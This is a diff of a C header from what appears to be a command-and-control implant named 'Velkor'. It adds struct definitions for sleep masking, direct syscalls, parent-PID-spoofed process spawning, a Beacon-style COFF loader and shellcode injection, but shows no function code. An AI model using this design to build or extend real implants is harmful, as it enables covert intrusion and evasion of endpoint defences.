@@ -13,6 +13,7 @@
 #include <Native.h>
 #include <Misc.h>
 #include <Ground.h>
+#include <Evasion.h>
 #include <Defines.h>
 #include <Communication.h>
 
@@ -29,13 +30,15 @@ typedef struct {
     PVOID SystemFunction040;
     PVOID NtTestAlert;
     PVOID VirtualProtect;
+    PVOID RtlExitUserThread;
+    PVOID RtlFillMemory;
     PVOID NtWaitForSingleObject;
     PVOID WaitForSingleObjectEx;
     PVOID NtGetContextThread;
     PVOID NtSetContextThread;
-    PVOID RtlExitUserThread;
     PVOID RtlCaptureContext;
     PVOID SetEvent;
+    PVOID LoadLibraryA;
     D_API( printf );
     D_API( strncmp );
     D_API( RtlAllocateHeap );
@@ -50,7 +53,7 @@ typedef struct {
 typedef struct {
     PPACKAGE Package;
     PWSTR    Host;
-    UINT16   Port;
+    WORD     Port;
     PWSTR    UserAgent;
     PWSTR    AddHeaders;
     PWSTR    ProxyServers;
@@ -58,6 +61,11 @@ typedef struct {
     PWSTR    ProxyPassword;
     BOOL     Secure;
 } WEB_INFO, *PWEB_INFO;
+
+struct {
+    UINT64 a;
+    UINT16 b;
+} FODSAS;
 
 typedef struct {
     MEM_RANGE ComputerName;
@@ -81,14 +89,14 @@ typedef struct {
 typedef struct {
     ULONG SleepTime;
     ULONG Jitter;
-    ULONG SleepTechnique;
+    ULONG SleepMask;
     PVOID JmpGadget;
     PVOID NtContinueGadget;
 } SLEEP_CONF;
 
 typedef struct {
     UINT32   AgentId;
-    eSYSCALL SyscallMethod = VelkorWinApi;
+    eSYSCALL SyscallMethod = VkCallWinApi;
     PWSTR    ProcessName;
     PWSTR    ProcessFullPath;
     PWSTR    CommandLine;
@@ -113,17 +121,66 @@ typedef struct {
 } MEM_VELKOR, *PMEM_VELKOR;
 
 typedef struct {
-    PSTR  ProcessFork;
-    PSTR  CurrentDir;
-    ULONG ParentPid;
-    BOOL  BlockDlls;
-} FORK, *PFORK;
+    API        FunctionPtr;
+    PVOID      Module[M_ENUM_SIZE];
+    VK_SYSCALL VkSyscall[SYS_ENUM_SIZE];
+} VK_WIN32, *PVK_WIN32;
+
+enum {
+    PsSpawn,
+    PsTarget
+} PS_TYPE;
 
 typedef struct {
-    API         FunctionPtr;
+    PSTR   ProcessName;
+    PSTR   CurrentDir;
+    ULONG  ParentPid;
+    HANDLE ParentHandle;
+    BOOL   BlockDlls;
+} PS_SPAWN, *PPS_SPAWN;
+
+typedef struct {
+    ULONG  ProcessId;
+    HANDLE ProcessHandle;
+} PS_TARGET, *PPS_TARGET;
+
+typedef struct {
+    ULONG     Type;
+    PS_SPAWN  Spawn;
+    PS_TARGET Target;
+} PS_CTX, *PPS_CTX;
+
+typedef struct {
+    ULONG BeaconXprName;
+    PVOID BeaconApiPtr;
+} BEACON_API, *PBEACON_API;
+
+typedef struct {
+    COFF_DATA   Data;
+    BEACON_API  BeaconApi[COFF_LEN];
+    BOOL        VehEnabled;
+} COFF_CTX, *PCOFF_CTX;
+
+typedef BOOL ( *SC_RUN )( HANDLE ProcessHandle, PBYTE ShellcodeBuffer, PSIZE_T ShellcodeSize, PVOID Parameter, BOOL PostEx );
+
+typedef struct {
+    PEX_ARGS Args;
+    SC_RUN   ScRun[SC_INJ_T_LEN];
+    ULONG    PeTechnique;
+    ULONG    CoffTechnique;
+} INJ_CTX, *PINJ_CTX;
+
+typedef struct {
+    PS_CTX   ProcessCtx;
+    COFF_CTX zCoffCtx;
+    INJ_CTX  InjectionCtx;
+} POST_EX, *PPOST_EX;
+
+typedef struct {
+    TASK_MGMT   TaskManager[TASK_LENGTH];
+    VK_WIN32    VkWin32;
     SLEEP_CONF  SleepConfig;
-    FORK        ForkConfig;
-    PVOID       Module[M_ENUM_SIZE];
+    POST_EX     PostEx;
     MEM_VELKOR  VelkorMemory;
     SESSION     Session;
     SYS_INFO    System;
